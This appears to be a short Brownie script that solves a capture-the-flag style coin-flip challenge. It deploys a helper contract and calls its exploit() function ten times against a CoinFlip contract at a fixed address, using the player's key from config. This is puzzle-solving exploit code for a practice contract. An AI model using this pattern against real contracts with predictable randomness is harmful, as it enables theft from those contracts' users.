from brownie import CoinFlip,CoinFlipCheck, network, config,accounts

def main():
    #input the contract address
    #> contract.address
    contractAddress = '0x87A929bFD9C8d78Cb66E360a06D0B452E45528C8'

    #use player account
    player = accounts.add(config["wallets"]["from_key"])
    
    coinflipContract = CoinFlip.at(contractAddress)

    print("deploying CheckFlipContract")
    checkFlipContract = CoinFlipCheck.deploy(coinflipContract.address,{"from":player})

    #check guess and submit
    for x in range(10):
        transaction = checkFlipContract.exploit({"from":player})
        transaction.wait(2)

        

   

     